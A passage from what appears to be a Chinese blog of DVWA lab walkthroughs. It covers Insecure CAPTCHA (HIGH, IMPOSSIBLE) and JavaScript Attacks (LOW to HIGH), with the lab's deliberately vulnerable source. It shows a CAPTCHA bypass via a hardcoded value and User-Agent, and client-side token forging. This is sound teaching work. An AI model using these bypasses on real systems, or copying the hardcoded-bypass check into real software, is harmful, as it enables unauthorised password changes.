<h1 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">'Change'</span> ] ) ) {</span><br><span class="line">        <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">'password_new'</span> ];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">'password_conf'</span> ];</span><br><span class="line">        <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">        <span class="variable">$resp</span> = <span class="title function_ invoke__">recaptcha_check_answer</span>(</span><br><span class="line">            <span class="variable">$_DVWA</span>[ <span class="string">'recaptcha_private_key'</span> ],</span><br><span class="line">            <span class="variable">$_POST</span>[<span class="string">'g-recaptcha-response'</span>]</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            <span class="variable">$resp</span> || </span><br><span class="line">            (</span><br><span class="line">                <span class="variable">$_POST</span>[ <span class="string">'g-recaptcha-response'</span> ] == <span class="string">'hidd3n_valu3'</span></span><br><span class="line">                &amp;&amp; <span class="variable">$_SERVER</span>[ <span class="string">'HTTP_USER_AGENT'</span> ] == <span class="string">'reCAPTCHA'</span></span><br><span class="line">            )</span><br><span class="line">        ){</span><br><span class="line">            <span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>) {</span><br><span class="line">                <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">                <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line">                <span class="comment">// Update database</span></span><br><span class="line">                <span class="variable">$insert</span> = <span class="string">"UPDATE `users` SET password = '<span class="subst">$pass_new</span>' WHERE user = '"</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">"' LIMIT 1;"</span>;</span><br><span class="line">                <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">                <span class="comment">// Feedback for user</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                <span class="comment">// Ops. Password mismatch</span></span><br><span class="line">                <span class="variable">$html</span>     .= <span class="string">"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"</span>;</span><br><span class="line">                <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">            }</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">            <span class="variable">$html</span>     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>服务器的验证逻辑是当$resp（这里是指谷歌返回的验证结果）是false，并且参数g-recaptcha-response不等于hidd3n_valu3（或者http包头的User-Agent参数不等于reCAPTCHA）时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。</p>
<h2 id="攻击检测"><a href="#攻击检测" class="headerlink" title="攻击检测"></a>攻击检测</h2><p>由于<code>$resp</code>参数无法控制，所以重心放在参数g-recaptcha-response、User-Agent上；</p>
<p>依旧抓包，更改参数<code>g-recaptcha-response</code>为<code>hidd3n_valu3</code>，更改<code>User-Agent</code>为<code>reCAPTCHA</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201121190524.png"></p>
<h1 id="IMPOSSIBLE"><a href="#IMPOSSIBLE" class="headerlink" title="IMPOSSIBLE"></a>IMPOSSIBLE</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">'Change'</span> ] ) ) {</span><br><span class="line">        <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">        <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">'user_token'</span> ], <span class="variable">$_SESSION</span>[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line">        <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">'password_new'</span> ];</span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass_new</span> );</span><br><span class="line">        <span class="variable">$pass_new</span>  = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">'password_conf'</span> ];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass_conf</span> );</span><br><span class="line">        <span class="variable">$pass_conf</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$pass_conf</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_conf</span> );</span><br><span class="line">        <span class="variable">$pass_curr</span> = <span class="variable">$_POST</span>[ <span class="string">'password_current'</span> ];</span><br><span class="line">        <span class="variable">$pass_curr</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass_curr</span> );</span><br><span class="line">        <span class="variable">$pass_curr</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$pass_curr</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="variable">$pass_curr</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_curr</span> );</span><br><span class="line">        <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">        <span class="variable">$resp</span> = <span class="title function_ invoke__">recaptcha_check_answer</span>(</span><br><span class="line">            <span class="variable">$_DVWA</span>[ <span class="string">'recaptcha_private_key'</span> ],</span><br><span class="line">            <span class="variable">$_POST</span>[<span class="string">'g-recaptcha-response'</span>]</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">        <span class="keyword">if</span>( !<span class="variable">$resp</span> ) {</span><br><span class="line">            <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// Check that the current password is correct</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> );</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">':user'</span>, <span class="title function_ invoke__">dvwaCurrentUser</span>(), PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">':password'</span>, <span class="variable">$pass_curr</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">            <span class="comment">// Do both new password match and was the current password correct?</span></span><br><span class="line">            <span class="keyword">if</span>( ( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>) &amp;&amp; ( <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>() == <span class="number">1</span> ) ) {</span><br><span class="line">                <span class="comment">// Update the database</span></span><br><span class="line">                <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">'UPDATE users SET password = (:password) WHERE user = (:user);'</span> );</span><br><span class="line">                <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">':password'</span>, <span class="variable">$pass_new</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">                <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">':user'</span>, <span class="title function_ invoke__">dvwaCurrentUser</span>(), PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">                <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">                <span class="comment">// Feedback for the end user - success!</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span> {</span><br><span class="line">                <span class="comment">// Feedback for the end user - failed!</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;"</span>;</span><br><span class="line">                <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>增加了Anti-CSRF Token机制防御CSRF攻击，利用PDO技术防护sql注入，验证过程终于不再分成两部分了，验证码无法绕过，同时要求用户输入之前的密码，进一步加强了身份认证。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.freebuf.com/articles/web/119692.html">https://www.freebuf.com/articles/web/119692.html</a></p>
]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>Insecure CAPTCHA</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA JavaScript Attacks</title>
    <url>/DVWA-JavaScript-Attacks.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>JavaScript攻击属于Web前端安全，不存在黑盒测试的概念，直接可以对JS进行白盒代码审计。</p>
<p>DVWA中的JavaScript攻击的场景是基于token由前端JS生成而引起的一系列问题。<span id="more"></span></p>
<h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>打开页面如下；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201123231356.png"></p>
<p>输入ChangeMe，显示错误；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201123231438.png"></p>
<p>输入success，显示不合法token值；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201123231522.png"></p>
<p>怀疑前端回直接修改token，查看前端源码，发现隐藏输入token；</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"low_js"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"token"</span> <span class="attr">value</span>=<span class="string">"8b479aefbd90795395b3e7089ae0dc09"</span> <span class="attr">id</span>=<span class="string">"token"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"phrase"</span>&gt;</span>Phrase<span class="tag">&lt;/<span class="name">label</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"phrase"</span> <span class="attr">value</span>=<span class="string">"ChangeMe"</span> <span class="attr">id</span>=<span class="string">"phrase"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">id</span>=<span class="string">"send"</span> <span class="attr">name</span>=<span class="string">"send"</span> <span class="attr">value</span>=<span class="string">"Submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>根据隐藏token的值，猜测是MD5加密，查看源码；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    $page[ 'body' ] .= &lt;&lt;&lt;EOF</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    /*</span><br><span class="line">    MD5 code from here</span><br><span class="line">    https://github.com/blueimp/JavaScript-MD5</span><br><span class="line">    */</span><br><span class="line">    !function(n){"use strict";function t(n,t){var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r}function r(n,t){return n&lt;&lt;t|n&gt;&gt;&gt;32-t}function e(n,e,o,u,c,f){return t(r(t(t(e,n),t(u,f)),c),o)}function o(n,t,r,o,u,c,f){return e(t&amp;r|~t&amp;o,n,t,u,c,f)}function u(n,t,r,o,u,c,f){return e(t&amp;o|r&amp;~o,n,t,u,c,f)}function c(n,t,r,o,u,c,f){return e(t^r^o,n,t,u,c,f)}function f(n,t,r,o,u,c,f){return e(r^(t|~o),n,t,u,c,f)}function i(n,r){n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]}function a(n){var t,r="",e=32*n.length;for(t=0;t&lt;e;t+=8)r+=String.fromCharCode(n[t&gt;&gt;5]&gt;&gt;&gt;t%32&amp;255);return r}function d(n){var t,r=[];for(r[(n.length&gt;&gt;2)-1]=void 0,t=0;t&lt;r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t&lt;e;t+=8)r[t&gt;&gt;5]|=(255&amp;n.charCodeAt(t/8))&lt;&lt;t%32;return r}function h(n){return a(i(d(n),8*n.length))}function l(n,t){var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length&gt;16&amp;&amp;(o=i(o,8*n.length)),r=0;r&lt;16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))}function g(n){var t,r,e="";for(r=0;r&lt;n.length;r+=1)t=n.charCodeAt(r),e+="0123456789abcdef".charAt(t&gt;&gt;&gt;4&amp;15)+"0123456789abcdef".charAt(15&amp;t);return e}function v(n){return unescape(encodeURIComponent(n))}function m(n){return h(v(n))}function p(n){return g(m(n))}function s(n,t){return l(v(n),v(t))}function C(n,t){return g(s(n,t))}function A(n,t,r){return t?r?s(t,n):C(t,n):r?m(n):p(n)}"function"==typeof define&amp;&amp;define.amd?define(function(){return A}):"object"==typeof module&amp;&amp;module.exports?module.exports=A:n.md5=A}(this);</span><br><span class="line">        function rot13(inp) {</span><br><span class="line">            return inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c&lt;="Z"?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);});</span><br><span class="line">        }</span><br><span class="line">        function generate_token() {</span><br><span class="line">            var phrase = document.getElementById("phrase").value;</span><br><span class="line">            document.getElementById("token").value = md5(rot13(phrase));</span><br><span class="line">        }</span><br><span class="line">        generate_token();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    EOF;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>实现了对输入的phrase进行一次rot13后再进行一次MD5加密；</p>
<p>提示要求输入success，此处猜测要提取MD5(rot13(“sucess”))作为token值，在浏览器控制栏计算该MD5值；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201123233617.png"></p>
<p>前端更改隐藏输入的值，再次输入success后显示成功；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201123233828.png"></p>
<h1 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>查看前端源码，发现和LOW级别类似，只是将JavaScript代码放在了文件中引用；</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"low_js"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"token"</span> <span class="attr">value</span>=<span class="string">"XXeMegnahCXX"</span> <span class="attr">id</span>=<span class="string">"token"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"phrase"</span>&gt;</span>Phrase<span class="tag">&lt;/<span class="name">label</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"phrase"</span> <span class="attr">value</span>=<span class="string">"ChangeMe"</span> <span class="attr">id</span>=<span class="string">"phrase"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">id</span>=<span class="string">"send"</span> <span class="attr">name</span>=<span class="string">"send"</span> <span class="attr">value</span>=<span class="string">"Submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../../vulnerabilities/javascript/source/medium.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>JavaScript代码如下；</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">do_something</span>(<span class="params">e</span>){</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="string">""</span>,n=e.<span class="property">length</span>-<span class="number">1</span>;n&gt;=<span class="number">0</span>;n--)</span><br><span class="line">    t+=e[n];</span><br><span class="line">  <span class="keyword">return</span> t;</span><br><span class="line">}</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>){<span class="title function_">do_elsesomething</span>(<span class="string">"XX"</span>)},<span class="number">300</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">do_elsesomething</span>(<span class="params">e</span>){</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"token"</span>).<span class="property">value</span>=<span class="title function_">do_something</span>(e+<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"phrase"</span>).<span class="property">value</span>+<span class="string">"XX"</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>分析代码，其功能是将phrase变量的值逆序；</p>
<p>只需要在输入框输入 “success” 后，在控制台中，输入<code>do_elsesomething("XX")</code>，再点击提交即可；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201124000108.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201124000123.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201124000141.png"></p>
<h1 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>HIGH级别和MEDIUM级别类似，生成token的逻辑在JavaScript文件中；</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a=[<span class="string">'fromCharCode'</span>,<span class="string">'toString'</span>,<span class="string">'replace'</span>,<span class="string">'BeJ'</span>,<span class="string">'\x5cw+'</span>,<span class="string">'Lyg'</span>,<span class="string">'SuR'</span>,<span class="string">'(w(){\x273M\x203L\x27;q\x201l=\x273K\x203I\x203J\x20T\x27;q\x201R=1c\x202I===\x271n\x27;q\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\x202L=!1R&amp;&amp;1c\x202M===\x271n\x27;q\x202o=!Y.2S&amp;&amp;1c\x202d===\x271n\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o){Y=3R}z\x20p(2L){Y=2M}q\x202G=!Y.3Q&amp;&amp;1c\x202g===\x271n\x27&amp;&amp;2g.X;q\x202s=1c\x202l===\x27w\x27&amp;&amp;2l.3P;q\x201y=!Y.3H&amp;&amp;1c\x20Z!==\x272T\x27;q\x20m=\x273G\x27.3z(\x27\x27);q\x202w=[-3y,3x,3v,3w];q\x20U=[24,16,8,0];q\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\x201E=[\x271e\x27,\x2727\x27,\x271G\x27,\x272R\x27];q\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\x204C.Q.2U.1I(1x)===\x27[1n\x201z]\x27}}p(1y&amp;&amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\x201c\x201x===\x271n\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z}}q\x202m=w(1X,x){A\x20w(s){A\x20O\x20N(x,1d).S(s)[1X]()}};q\x202a=w(x){q\x20P=2m(\x271e\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\x20O\x20N(x)};P.S=w(s){A\x20P.1T().S(s)};1g(q\x20i=0;i&lt;1E.W;++i){q\x20T=1E[i];P[T]=2m(T,x)}A\x20P};q\x202P=w(P,x){q\x201S=2O(\x222N(\x271S\x27)\x22);q\x201Y=2O(\x222N(\x271w\x27).1Y\x22);q\x202n=x?\x271H\x27:\x271q\x27;q\x202z=w(s){p(1c\x20s===\x272p\x27){A\x201S.2x(2n).S(s,\x274S\x27).1G(\x271e\x